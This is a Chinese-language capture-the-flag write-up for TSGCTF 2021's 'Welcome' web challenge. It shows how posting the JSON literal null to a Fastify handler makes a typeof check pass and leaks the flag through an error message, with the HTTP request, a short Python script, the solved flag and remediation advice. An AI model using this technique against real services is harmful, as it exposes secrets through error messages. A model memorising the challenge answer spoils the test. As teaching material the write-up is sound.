# TSGCTF2021 Welcome to TSG CTF WP

## 题目简述

服务把 flag 作为对象属性名读取：

```javascript
const flag = process.env.FLAG;

app.post('/', (req, res) => {
  if (typeof req.body === 'object' && req.body[flag] === true) {
    return res.send(`Nice! flag is ${flag}`);
  }
  return res.send('You failed...');
});
```

正常前端会发送 `{[guess]: true}`，似乎只能猜中完整 flag。漏洞在于 JavaScript 中 `typeof null === "object"`，而对 `null` 取属性会抛出包含属性名的异常。

## 解题过程

直接发送 JSON 字面量 `null`：

```http
POST / HTTP/1.1
Content-Type: application/json

null
```

Fastify 将请求体解析为 JavaScript 的 `null`。第一项判断错误地通过：

```javascript
typeof null === 'object'  // true
```

随后执行：

```javascript
req.body[flag]
```

运行时为了构造 TypeError，会把实际属性名插入错误消息。Fastify 默认错误处理器再把消息以 JSON 返回，响应形如：

```json
{
  "statusCode": 500,
  "error": "Internal Server Error",
  "message": "Cannot read properties of null (reading 'TSGCTF{...}')"
}
```

因此只需解析 `message` 字段即可得到：

```text
TSGCTF{M4king_We6_ch4l1en9e_i5_1ik3_playing_Jenga}
```

最小请求脚本为：

```python
response = requests.post(url, data="null", headers={
    "Content-Type": "application/json",
})
print(response.json()["message"])
```

## 方法总结

本题把 JavaScript 的历史类型语义与详细异常回显组合成秘密泄露。检查“对象”时必须同时排除 `null`，例如 `body !== null && typeof body === "object"`；更重要的是，不应把秘密本身作为可能出现在异常文本中的属性名。生产环境还应统一返回不含内部变量、属性和堆栈的错误响应。
